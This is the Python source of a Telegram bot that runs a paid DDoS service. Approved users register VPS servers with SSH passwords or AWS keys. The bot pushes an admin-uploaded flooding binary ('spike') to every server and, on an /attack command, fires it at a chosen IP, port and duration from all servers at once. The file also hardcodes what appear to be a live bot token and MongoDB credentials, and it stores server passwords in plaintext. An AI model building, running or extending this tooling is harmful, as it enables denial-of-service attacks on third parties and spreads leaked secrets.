import logging
import datetime
import asyncio
import os
import asyncssh
from telegram.ext import filters
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
from bson import Binary

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Telegram API & MongoDB credentials (REPLACE WITH YOURS)
TELEGRAM_BOT_TOKEN = "6982857776:AAFDG6KtTz4T6jYjeZiwFdqZgTpqSW8Mj3Y"
MONGO_URI = "mongodb+srv://jonny:ranbal1@jonny.wwfqv.mongodb.net/?retryWrites=true&w=majority&appName=jonny"
DB_NAME = "TEST"

# Database setup
client = MongoClient(MONGO_URI)
db = client[DB_NAME]
vps_collection = db["vps_list"]
aws_vps_collection = db["aws_vps_list"]
approved_users_collection = db["approved_users"]
settings_collection = db["settings"]

ADMIN_USER_ID =  5759284972 # Replace with your Telegram Admin ID
SSH_SEMAPHORE = asyncio.Semaphore(100)

# Directory for storing .pem files
PEM_FILE_DIR = "./pem_files/"
os.makedirs(PEM_FILE_DIR, exist_ok=True)

# Directory to store binaries
BINARY_FILE_DIR = "./binaries/"
os.makedirs(BINARY_FILE_DIR, exist_ok=True)

# Start command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    keyboard = [
        [InlineKeyboardButton("➕ Add VPS", callback_data="add_vps")],
        [InlineKeyboardButton("📄 VPS Status", callback_data="vps_status")],
        [InlineKeyboardButton("🚀 Attack", callback_data="attack")],
    ]
    
    if user_id == ADMIN_USER_ID:
        keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = "🔥 *Welcome to the VPS Bot!* 🔥\n\nUse the buttons below to get started."

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown", reply_markup=reply_markup)
async def add_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Ensure only admin can add users
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id, "❌ *You are not authorized to add users!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /add_user <telegram_id> <days_valid>*", parse_mode="Markdown")
        return

    new_user_id, days_valid = args
    new_user_id = int(new_user_id)
    days_valid = int(days_valid)

    expiry_date = datetime.datetime.utcnow() + datetime.timedelta(days=days_valid)
    
    approved_users_collection.update_one(
        {"user_id": new_user_id},
        {"$set": {"user_id": new_user_id, "expiry": expiry_date}},
        upsert=True
    )

    await context.bot.send_message(chat_id, f"✅ *User {new_user_id} approved for {days_valid} days!*", parse_mode="Markdown")

async def remove_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Ensure only admin can remove users
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id, "❌ *You are not authorized to remove users!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /remove_user <telegram_id>*", parse_mode="Markdown")
        return

    target_user_id = int(args[0])

    result = approved_users_collection.delete_one({"user_id": target_user_id})

    if result.deleted_count > 0:
        await context.bot.send_message(chat_id, f"✅ *User {target_user_id} has been removed!*", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id, f"⚠️ *User {target_user_id} was not found!*", parse_mode="Markdown")

async def list_users(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Ensure only admin can list users
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id, "❌ *You are not authorized to view the user list!*", parse_mode="Markdown")
        return

    users = list(approved_users_collection.find())

    if not users:
        await context.bot.send_message(chat_id, "📋 *No approved users found!*", parse_mode="Markdown")
        return

    message = "*✅ Approved Users:*\n\n"
    for user in users:
        user_id = user.get("user_id", "Unknown")
        expiry = user.get("expiry", "Unknown")
        if expiry != "Unknown":
            expiry = expiry.strftime("%Y-%m-%d %H:%M:%S UTC")  # Format date nicely

        message += f"👤 *User:* `{user_id}` | ⏳ *Expires:* `{expiry}`\n"

    await context.bot.send_message(chat_id, text=message, parse_mode="Markdown")

# Handle binary file uploads
async def upload_binary_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Only allow the admin to upload binaries
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id, "❌ *You are not authorized to upload binaries!*", parse_mode="Markdown")
        return

    await context.bot.send_message(chat_id, "📂 *Please upload your binary file now.*", parse_mode="Markdown")

async def handle_binary_upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    document = update.message.document

    if not document:
        await context.bot.send_message(chat_id, "❌ *No document found! Please upload a file.*", parse_mode="Markdown")
        return

    file_name = document.file_name.lower()  # Normalize case

    # Ensure this is NOT a .pem file
    if file_name.endswith(".pem"):
        await context.bot.send_message(chat_id, "❌ *Use /upload_pem for .pem files!*", parse_mode="Markdown")
        return

    file_path = os.path.join(BINARY_FILE_DIR, file_name)
    
    # Download the binary file
    file = await context.bot.get_file(document.file_id)
    await file.download_to_drive(file_path)

    # Read binary data
    with open(file_path, "rb") as f:
        binary_data = f.read()

    # Store the binary in MongoDB for future use
    settings_collection.update_one(
        {"name": "binary_file"},
        {"$set": {"binary": Binary(binary_data), "file_name": file_name}},
        upsert=True
    )

    await context.bot.send_message(chat_id, f"✅ *Binary file uploaded and stored!*\n📂 Path: `{file_path}`", parse_mode="Markdown")

async def setup_vps(update: Update, context: CallbackContext):
    """Deploy binary file to all VPS instances (AWS & Regular)."""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Admin can always use the command
    if user_id == ADMIN_USER_ID:
        pass
    else:
        # Check if user is approved
        user_approval = approved_users_collection.find_one({"user_id": user_id})
        if not user_approval or "expiry" not in user_approval:
            await context.bot.send_message(chat_id, "❌ *You are not approved to use this command. Contact the admin.*", parse_mode="Markdown")
            return

        # Check if approval expired
        current_time = datetime.datetime.utcnow()
        expiry_time = user_approval["expiry"]
        if expiry_time < current_time:
            approved_users_collection.delete_one({"user_id": user_id})  # Remove expired users
            await context.bot.send_message(chat_id, "❌ *Your approval has expired! Contact the admin for renewal.*", parse_mode="Markdown")
            return

    # Fetch all VPS instances
    vps_list = list(vps_collection.find({"user_id": user_id}))
    aws_vps_list = list(aws_vps_collection.find({"user_id": user_id}))

    if not vps_list and not aws_vps_list:
        await context.bot.send_message(chat_id, "❌ *No VPS configured! Use /add_vps or /add_aws_vps first.*", parse_mode="Markdown")
        return

    # Retrieve stored binary from MongoDB
    binary_doc = settings_collection.find_one({"name": "binary_file"})
    if not binary_doc:
        await context.bot.send_message(chat_id, "❌ *No binary uploaded! Admin must upload it first.*", parse_mode="Markdown")
        return

    binary_data = binary_doc["binary"]
    file_name = binary_doc["file_name"]

    await context.bot.send_message(chat_id, f"🔄 *Deploying {file_name} to VPS instances...*", parse_mode="Markdown")

    tasks = []

    # Regular VPS Setup
    for vps in vps_list:
        tasks.append(deploy_binary(vps, binary_data, file_name, chat_id, context, "regular"))

    # AWS VPS Setup (Separate Handling for PEM Authentication)
    for vps in aws_vps_list:
        tasks.append(deploy_binary(vps, binary_data, file_name, chat_id, context, "aws"))

    await asyncio.gather(*tasks)

    await context.bot.send_message(chat_id, "✅ *Setup completed on all VPS servers!*", parse_mode="Markdown")

async def deploy_binary(vps_data, binary_data, file_name, chat_id, context, vps_type):
    """Uploads the binary and sets permissions on a VPS."""
    async with SSH_SEMAPHORE:
        try:
            # AWS VPS (PEM Key Authentication)
            if vps_type == "aws" and "pem_file" in vps_data:
                conn = await asyncssh.connect(
                    vps_data["ip"],
                    username=vps_data["username"],
                    client_keys=[vps_data["pem_file"]],
                    known_hosts=None
                )
            # Regular VPS (Password Authentication)
            else:
                conn = await asyncssh.connect(
                    vps_data["ip"],
                    username=vps_data["username"],
                    password=vps_data["password"],
                    known_hosts=None
                )

            await context.bot.send_message(chat_id, f"🚀 *Uploading to {vps_data['ip']} ({vps_type})...*", parse_mode="Markdown")

            # Upload the binary file
            async with conn.start_sftp_client() as sftp:
                async with sftp.open(file_name, "wb") as remote_file:
                    await remote_file.write(binary_data)

            # Set execute permissions
            await conn.run(f"chmod +x {file_name}", check=True)

            await context.bot.send_message(chat_id, f"✅ *Binary installed on {vps_data['ip']} ({vps_type})!*", parse_mode="Markdown")

        except asyncssh.Error as e:
            await context.bot.send_message(chat_id, f"❌ *Error on {vps_data['ip']} ({vps_type}): {str(e)}*", parse_mode="Markdown")

# Add VPS command
async def add_vps(update: Update, context: CallbackContext):
    """Allow only approved users to add VPS."""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Admin can always use the command
    if user_id == ADMIN_USER_ID:
        pass
    else:
        # Check if user is approved
        user_approval = approved_users_collection.find_one({"user_id": user_id})
        if not user_approval or "expiry" not in user_approval:
            await context.bot.send_message(chat_id, "❌ *You are not approved to use this command. Contact the admin for access.*", parse_mode="Markdown")
            return

        # Check if approval expired
        current_time = datetime.datetime.utcnow()
        expiry_time = user_approval["expiry"]
        if expiry_time < current_time:
            approved_users_collection.delete_one({"user_id": user_id})  # Remove expired users
            await context.bot.send_message(chat_id, "❌ *Your approval has expired! Contact the admin for renewal.*", parse_mode="Markdown")
            return

    # Command execution continues if the user is approved
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /add_vps <ip> <username> <password>*", parse_mode="Markdown")
        return

    ip, username, password = args
    vps_collection.insert_one({"user_id": user_id, "ip": ip, "username": username, "password": password})

    await context.bot.send_message(chat_id, "✅ *VPS added successfully!*", parse_mode="Markdown")

# Add AWS VPS (EC2/Lightsail)
async def add_aws_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if len(args) != 3:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /add_aws_vps <ip> <username> <pem_filename>*", parse_mode='Markdown')
        return

    ip, username, pem_filename = args
    aws_vps_collection.insert_one({"user_id": user_id, "ip": ip, "username": username, "pem_file": f"{PEM_FILE_DIR}{pem_filename}"})
    await context.bot.send_message(chat_id, "✅ *AWS VPS added successfully!*", parse_mode='Markdown')

# Step 1: User sends `/upload_pem` command to start the process
async def upload_pem_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    await context.bot.send_message(chat_id, "📂 *Please upload your .pem file now.*", parse_mode="Markdown")

async def handle_pem_upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    document = update.message.document
    file_name = document.file_name.lower()  # Normalize case

    if not file_name.endswith(".pem"):
        await context.bot.send_message(chat_id, "❌ *Use /upload_binary for non-.pem files!*", parse_mode="Markdown")
        return

    file_path = os.path.join(PEM_FILE_DIR, file_name)

    # Download the .pem file
    file = await context.bot.get_file(document.file_id)
    await file.download_to_drive(file_path)

    # Read and store the .pem file in MongoDB
    with open(file_path, "rb") as f:
        pem_data = f.read()

    settings_collection.update_one(
        {"name": "pem_file"},
        {"$set": {"pem": Binary(pem_data), "file_name": file_name}},
        upsert=True
    )

    await context.bot.send_message(chat_id, f"✅ *PEM file uploaded and stored in MongoDB!*\n📂 Path: `{file_path}`", parse_mode="Markdown")

# VPS Status


async def vps_status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Fetch VPS data
    vps_list = list(vps_collection.find({"user_id": user_id}))
    aws_vps_list = list(aws_vps_collection.find({"user_id": user_id}))

    if not vps_list and not aws_vps_list:
        await context.bot.send_message(chat_id, "❌ *No VPS configured!* Use /add_vps or /add_aws_vps.", parse_mode="Markdown")
        return

    # Start building message
    message = "*🔧 VPS Status:*\n\n"

    for vps in vps_list:
        ip = vps.get("ip", "Unknown")
        username = vps.get("username", "Unknown")
        message += f"🌍 *VPS:* `{ip}` | 👤 *User:* `{username}`\n"

    for vps in aws_vps_list:
        ip = vps.get("ip", "Unknown")
        username = vps.get("username", "Unknown")
        pem_path = vps.get("pem_file", "Unknown")
        pem_filename = os.path.basename(pem_path) if pem_path != "Unknown" else "Unknown"

        message += f"☁️ *AWS VPS:* `{ip}` | 👤 *User:* `{username}` | 🔑 *PEM:* `{pem_filename}`\n"

    await context.bot.send_message(chat_id, text=message, parse_mode="Markdown")

async def remove_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Ensure the user provided the VPS IP to remove
    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /remove_vps <vps_ip>*", parse_mode="Markdown")
        return

    vps_ip = args[0]

    # Admin can remove any VPS
    if user_id == ADMIN_USER_ID:
        result = vps_collection.delete_one({"ip": vps_ip})
        aws_result = aws_vps_collection.delete_one({"ip": vps_ip})
    else:
        # Regular users can only remove their own VPS
        result = vps_collection.delete_one({"user_id": user_id, "ip": vps_ip})
        aws_result = aws_vps_collection.delete_one({"user_id": user_id, "ip": vps_ip})

    if result.deleted_count > 0 or aws_result.deleted_count > 0:
        await context.bot.send_message(chat_id, f"✅ *VPS `{vps_ip}` has been removed!*", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id, f"⚠️ *No VPS found with IP `{vps_ip}` or you don't have permission to remove it!*", parse_mode="Markdown")

# SSH attack execution
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is an admin or an approved user
    if user_id == ADMIN_USER_ID:
        pass  # Admin can always use the command
    else:
        user_approval = approved_users_collection.find_one({"user_id": user_id})
        if not user_approval or "expiry" not in user_approval:
            await context.bot.send_message(chat_id, "❌ *You are not approved to use this command. Contact the admin.*", parse_mode="Markdown")
            return

        # Check if approval has expired
        current_time = datetime.datetime.utcnow()
        expiry_time = user_approval["expiry"]
        if expiry_time < current_time:
            approved_users_collection.delete_one({"user_id": user_id})  # Remove expired users
            await context.bot.send_message(chat_id, "❌ *Your approval has expired! Contact the admin for renewal.*", parse_mode="Markdown")
            return

    # Parse arguments
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /attack <target_ip> <port> <duration>*", parse_mode="Markdown")
        return

    target_ip, port, duration = args
    port = int(port)
    duration = int(duration)

    # Fetch **ALL** VPS instances, not just the user's
    vps_list = list(vps_collection.find())  # Fetch all VPS instances
    aws_vps_list = list(aws_vps_collection.find())  # Fetch all AWS VPS instances

    if not vps_list and not aws_vps_list:
        await context.bot.send_message(chat_id, "❌ *No VPS available!* Contact the admin to add VPS.", parse_mode="Markdown")
        return

    total_vps = len(vps_list) + len(aws_vps_list)
    await context.bot.send_message(chat_id, f"🔥 *Starting attack using {total_vps} proxy!*", parse_mode="Markdown")

    # Run attacks in parallel
    tasks = []

    # Regular VPS Attack
    for vps in vps_list:
        tasks.append(run_ssh_attack(vps, target_ip, port, duration, chat_id, context, attack_type="regular"))

    # AWS VPS Attack
    for vps in aws_vps_list:
        tasks.append(run_ssh_attack(vps, target_ip, port, duration, chat_id, context, attack_type="aws"))

    await asyncio.gather(*tasks)

# Run SSH attack
async def run_ssh_attack(vps_data, target_ip, port, duration, chat_id, context, attack_type="regular"):
    async with SSH_SEMAPHORE:
        try:
            # AWS VPS (PEM Key Authentication)
            if attack_type == "aws" and "pem_file" in vps_data:
                conn = await asyncssh.connect(
                    vps_data["ip"], 
                    username=vps_data["username"], 
                    client_keys=[vps_data["pem_file"]], 
                    known_hosts=None
                )
            # Regular VPS (Password Authentication)
            else:
                conn = await asyncssh.connect(
                    vps_data["ip"], 
                    username=vps_data["username"], 
                    password=vps_data["password"], 
                    known_hosts=None
                )

            # Use different attack commands for AWS and Regular VPS
            if attack_type == "aws":
                command = f"./spike {target_ip} {port} {duration} 6 900"
            else:
                command = f"./spike {target_ip} {port} {duration} 1024 900"

            await conn.run(command, check=True)
            await context.bot.send_message(chat_id, f"✅ *Attack executed on ({attack_type})*", parse_mode="Markdown")

        except asyncssh.Error as e:
            await context.bot.send_message(chat_id, f"❌ *Error on {vps_data['ip']} ({attack_type}): {str(e)}*", parse_mode="Markdown")



# Main function
def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("add_vps", add_vps))
    app.add_handler(CommandHandler("add_aws_vps", add_aws_vps))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("vps_status", vps_status))
    app.add_handler(CommandHandler("upload_pem", upload_pem_command))
    app.add_handler(CommandHandler("upload_binary", upload_binary_command))
    app.add_handler(CommandHandler("setup", setup_vps))
    app.add_handler(CommandHandler("add_user", add_user))
    app.add_handler(CommandHandler("remove_user", remove_user))
    app.add_handler(CommandHandler("list_users", list_users))
    app.add_handler(CommandHandler("remove_vps", remove_vps))




    # Fixed filters for .pem and binary files
    app.add_handler(MessageHandler(filters.Document.FileExtension("pem"), handle_pem_upload))
    app.add_handler(MessageHandler(~filters.Document.FileExtension("pem"), handle_binary_upload))

    # Schedule the expired user removal task
    loop = asyncio.get_event_loop()

    app.run_polling()




if __name__ == "__main__":
    main()
